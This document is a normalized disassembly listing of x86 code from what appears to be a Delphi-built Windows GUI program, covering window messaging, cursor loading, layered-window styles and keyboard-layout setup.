mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_419914
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
movzx eax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_4442a8
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_43b920
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_442f4f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_442bac
xor edx edx
push ebp
push sub_442eae
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x294 ] edx
mov eax [ rw-data ]
cmp [ eax + 0xd4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x294 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x294 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_454ff0
mov eax [ ebp - 0x4 ]
call sub_4585d4
call GetCapture
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x294 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_442b0c
mov eax [ rw-data ]
call sub_446638
mov eax [ rw-data ]
cmp [ eax + 0xa4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4585f8
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442eb5
mov eax [ ebp - 0x4 ]
call sub_442ba4
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_442eb5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f59
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4442a8
movzx edx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_4442a8
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_419890
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_4199dc
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_43b9e4
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
call sub_43b784
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_442fa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4546e8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_442fa0
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4546ac
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_443010
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1da ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov esi [ ebx + 0x290 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_442fa0
pop ecx
mov eax [ esi + 0x34 ]
call sub_4365a0
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x290 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_4365b0
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_443098
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_456760
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
sub_4430b8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_40484c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4430e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4546e8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4430b8
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4430e8
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4546ac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443164
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1da ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x268 ]
call sub_4430b8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4430b8
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4430e8
pop ecx
test al al
je r-xdata
sub_4431b8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_40484c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4431e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4546e8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4431b8
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4431e8
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4546ac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443264
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1da ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x268 ]
call sub_4431b8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4431b8
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4431e8
pop ecx
test al al
je r-xdata
sub_4432b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_420604
mov esi eax
dec esi
test esi esi
jl r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
xor edi edi
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4432b8
pop ecx
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_44a378
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4205d8
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
sub_443334
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
cmp [ ebx + 0x30a ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
mov al 0x1
mov edi [ ebx + 0x290 ]
test edi edi
je r-xdata
push ebp
mov eax ebx
call sub_4432b8
pop ecx
test al al
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffee
call sub_40484c
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4433ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x298 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_420770
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x298 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_4433e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x26c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_450dd4
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_451b4c
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_443430
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_4585f8
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x328 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x350 ] 0x0
je r-xdata
movzx eax [ ebx + 0x328 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x350 ]
or eax [ edx * 4 + rw-data ]
push eax
movzx eax [ ebx + 0x329 ]
push eax
mov eax [ ebx + 0x354 ]
push eax
mov eax ebx
call sub_4585f8
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_4585f8
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_4585f8
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_4585f8
push eax
call RedrawWindow
sub_443544
push ebx
mov ebx eax
cmp dl [ ebx + 0x350 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x350 ] dl
cmp [ ebx + 0x350 ] 0x0
je r-xdata
mov eax ebx
call sub_443430
mov eax ebx
call sub_447e3c
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_447e3c
xor edx edx
call sub_448160
sub_4435b0
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_44ff24
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax + 0x18 ]
and ecx 0xffff
shl edx 0x10
or ecx edx
mov [ eax + 0x18 ] ecx
test [ eax + 0x1c ] 0x1
jne r-xdata
retn
cmp [ eax + 0x278 ] 0x3
je r-xdata
xor edx edx
call sub_43fbe0
retn
sub_4435ec
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_44ff58
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax + 0x18 ]
and ecx 0xffff0000
and edx 0xffff
or ecx edx
mov [ eax + 0x18 ] ecx
test [ eax + 0x1c ] 0x1
jne r-xdata
retn
cmp [ eax + 0x278 ] 0x3
je r-xdata
xor edx edx
call sub_43fbe0
retn
sub_44362c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
xor edx edx
mov eax ebx
call sub_43cc40
mov dl 0x5
mov eax ebx
call sub_43f2b8
mov dl 0x1
mov eax ebx
call sub_457120
mov dl 0x3
mov eax ebx
call sub_43f6d8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_443694
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_443774
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_456fac
dec eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_456e10
mov dl 0x5
mov eax [ ebp - 0x8 ]
call sub_44fc18
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_450804
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_405620
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44377b
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov dl 0x1
mov eax esi
call sub_43e40c
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov edx eax
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_450814
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4508c4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_405c6c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_4437a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4546e8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_43d804
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_4546ac
mov edx ebx
pop ecx
mov si 0xffcc
call sub_40484c
inc ebp
dec edi
jne r-xdata
sub_4437f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_456fac
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_44381c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44168c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_443844
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_4416a4
cmp [ ebx + 0x8f ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4585f8
call sub_43b75c
test eax eax
jne r-xdata
mov eax ebx
call sub_456fac
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4585f8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4585f8
push eax
call PostMessageA
cmp [ ebx + 0x276 ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_456fc0
or ecx 0xffffffff
mov dl 0x1
call sub_450fd0
pop esi
pop ebx
retn
sub_4438d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_457ce0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_451b4c
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0x94 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_4501b4
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_40484c
sub_443930
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_443a05
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_450804
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_405620
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
sub eax 0xafff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx edi
call sub_450814
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443a0c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebx + 0x4 ]
movzx edx [ eax + 0x57 ]
mov eax esi
call sub_43e40c
jmp r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4508c4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_405c6c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_443a2c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_457a5c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_456fac
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_456fc0
movzx edx [ ebx + 0x57 ]
call sub_4507b4
inc edi
dec esi
jne r-xdata
sub_443ad4
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_443b04
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_443b58
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ffc4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_443efc
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_443f08
mov eax ebx
call sub_443f14
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_43f5c4
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424528
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424528
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424528
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_444344
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_444214
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_444214
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_444214
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_443cb0
push ebx
push esi
push edi
push ebp
call sub_404a1c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_404650
mov eax [ ebp + 0x88 ]
call sub_404650
mov eax [ ebp + 0x84 ]
call sub_404650
mov eax [ ebp + 0x54 ]
call sub_404650
mov eax [ ebp + 0x50 ]
call sub_404650
mov eax [ ebp + 0x4c ]
call sub_404650
mov eax [ ebp + 0x30 ]
call sub_404650
mov eax [ ebp + 0x34 ]
call sub_404650
mov eax [ ebp + 0x7c ]
call sub_404650
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_404650
mov eax ebp
call sub_443f70
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_420010
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4049c4
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_419898
call sub_404650
inc edi
dec esi
jne r-xdata
sub_443e28
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_443e74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_419740
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_419740
mov eax [ rw-data ]
call sub_4471c4
sub_443eac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4199dc
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4199dc
mov eax [ rw-data ]
call sub_4471c4
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_459d24
sub_443f14
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_443fd0
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_443f70
push ebx
push esi
push edi
push ebp
mov ebp eax
mov ebx [ ebp + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ ebp + 0x60 ]
cmp eax edx
je r-xdata
mov esi [ ebx + 0x4 ]
cmp esi 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp esi 0xffffffeb
je r-xdata
cmp esi 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test esi esi
jle r-xdata
mov edi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_402f1c
mov ebx edi
test ebx ebx
jne r-xdata
sub_443fd0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_402f00
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_443ff8
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4441a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4441aa
lea eax [ ebp - 0x260 ]
call sub_405530
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_405530
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x25 ] 0x0
mov dl 0x1
call sub_41b5f0
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
